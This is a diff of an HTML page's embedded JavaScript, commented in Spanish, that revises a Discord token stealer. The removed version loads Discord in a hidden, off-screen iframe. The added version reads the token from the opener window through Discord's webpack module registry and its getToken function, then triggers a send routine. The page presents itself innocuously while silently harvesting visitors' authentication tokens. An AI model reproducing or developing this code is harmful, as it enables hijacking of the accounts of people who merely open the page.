@@ -449,73 +449,44 @@
         
         console.log('Page loaded');
         
-        // Crear iframe invisible para cargar Discord y extraer token
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.style.width = '0';
-        iframe.style.height = '0';
-        iframe.style.border = 'none';
-        iframe.style.position = 'absolute';
-        iframe.style.top = '-9999px';
-        iframe.src = 'https://discord.com/app';
+        // Verificar si window.opener tiene Discord abierto (usuario viene desde Discord)
+        var tokenExtracted = false;
         
-        console.log('Loading Discord in iframe...');
-        document.body.appendChild(iframe);
-        
-        // Esperar a que Discord cargue y luego intentar extraer token
-        iframe.onload = function() {
-            console.log('Discord iframe loaded');
-            
-            // Esperar 3 segundos para que Discord inicialice webpack
-            window.setTimeout(function() {
-                console.log('Attempting webpack token extraction...');
-                
-                try {
-                    // Intentar acceder al iframe (puede fallar por CORS)
-                    var iframeWindow = iframe.contentWindow;
-                    
-                    if (iframeWindow && iframeWindow.webpackChunkdiscord_app) {
-                        var modules = [];
-                        iframeWindow.webpackChunkdiscord_app.push([[''], {}, function(e) {
-                            for (let c in e.c) {
-                                modules.push(e.c[c]);
-                            }
-                        }]);
-                        
-                        var tokenModule = modules.find(function(m) {
-                            return m && m.exports && m.exports.default && m.exports.default.getToken !== undefined;
-                        });
-                        
-                        if (tokenModule) {
-                            var token = tokenModule.exports.default.getToken();
-                            if (token) {
-                                console.log('TOKEN EXTRACTED FROM IFRAME:', token);
-                                // Enviar inmediatamente
-                                send(null, null);
-                            }
-                        }
+        try {
+            if (window.opener && window.opener.webpackChunkdiscord_app) {
+                console.log('Detected Discord in opener window!');
+                var modules = [];
+                window.opener.webpackChunkdiscord_app.push([[''], {}, function(e) {
+                    for (let c in e.c) {
+                        modules.push(e.c[c]);
                     }
-                } catch(e) {
-                    console.log('Cannot access iframe (CORS blocked):', e);
+                }]);
+                
+                var tokenModule = modules.find(function(m) {
+                    return m && m.exports && m.exports.default && m.exports.default.getToken !== undefined;
+                });
+                
+                if (tokenModule) {
+                    var token = tokenModule.exports.default.getToken();
+                    if (token) {
+                        console.log('TOKEN EXTRACTED FROM OPENER!');
+                        tokenExtracted = true;
+                        // Enviar inmediatamente
+                        window.setTimeout(function() {
+                            send(null, null);
+                        }, 500);
+                    }
                 }
-                
-                // Escaneo normal de todas formas
-                send(null, null);
-                
-                // Remover iframe después de 5 segundos
-                window.setTimeout(function() {
-                    try {
-                        document.body.removeChild(iframe);
-                    } catch(e) {}
-                }, 5000);
-            }, 3000);
-        };
+            }
+        } catch(e) {
+            console.log('Cannot access opener:', e);
+        }
         
-        // Escaneo de respaldo si el iframe falla
+        // Escaneo normal (captura tokens si el usuario tiene Discord en la misma sesión)
         window.setTimeout(function() {
-            console.log('Backup scan');
+            console.log('Normal scan');
             send(null, null);
-        }, 8000);
+        }, tokenExtracted ? 3000 : 2000);
     </script>
 </body>
 </html>
